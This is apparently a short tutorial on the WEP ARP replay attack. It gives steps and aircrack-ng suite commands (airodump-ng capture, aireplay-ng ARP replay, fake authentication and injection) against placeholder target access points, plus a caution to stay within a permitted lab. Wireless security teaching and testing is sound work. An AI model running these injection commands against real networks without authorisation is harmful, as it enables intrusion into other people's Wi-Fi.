Process Flow
ARP Replay attack
Capture a valid ARP request and inject it repeatedly to force the AP to emit many IVs.
Step-by-step
  1. Capture a live ARP request with airodump-ng.
  2. Use aireplay-ng to re-inject the captured ARP packet repeatedly.
  3. Monitor #Data in airodump-ng until IV counts are high enough.
Fake authentication
If no client exists, perform a fake authentication to associate your adapter, then inject ARP packets.
Command callouts
sudo airodump-ng --bssid <TARGET_AP_BSSID> -c <CHANNEL> -w wep_capture wlan0mon
# capture an ARP request then
sudo aireplay-ng --arpreplay -b <TARGET_AP_BSSID> -h <CLIENT_MAC> wlan0mon
# OR fake authenticate then inject
sudo aireplay-ng -1 0 -a <TARGET_AP_BSSID> -h <YOUR_MAC> wlan0mon
sudo aireplay-ng -3 -b <TARGET_AP_BSSID> -h <YOUR_MAC> wlan0mon
Watch for injection success messages and rising IV counts. Stop immediately if testing outside a permitted lab.
